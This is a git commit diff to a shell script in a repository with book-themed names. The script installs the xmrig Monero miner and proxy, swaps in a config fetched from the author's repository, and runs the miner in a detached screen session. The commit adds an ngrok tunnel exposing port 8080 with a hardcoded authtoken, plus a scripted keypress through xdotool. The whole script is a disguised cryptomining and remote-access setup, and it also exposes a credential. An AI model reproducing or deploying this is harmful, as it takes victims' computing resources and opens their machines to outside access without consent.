bcd75b7b1dd610e28b054f641339f331eb630361
Novabooks21 <102823609+Novabooks21@users.noreply.github.com>
2022-04-05 21:08:55 +0530

    Update PMain.sh

--- MainData/PMain.sh
+++ MainData/PMain.sh
@@ -14,6 +14,17 @@ tar xvzf xmrig-proxy-6.15.1-focal-x64.tar.gz
 cd xmrig-proxy-6.15.1
 rm config.json
 wget https://raw.githubusercontent.com/Novabooks21/CoolBooks2/main/MainData/P/config.json
+cd ~/MyBooks
+
+wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.tgz
+tar xvzf ngrok-stable-linux-amd64.tgz
+
+./ngrok authtoken 27NtTVH9Fq9IOqnzhBZEqXhFxmL_6d3wWjMopDYNTkiFeo62Y
+./ngrok http 8080
+
+xdotool key --window "$id" alt+r
+
+cd ~/MyBooks/xmrig-proxy-6.15.1
 
 screen -R xmr
 ./xmrig
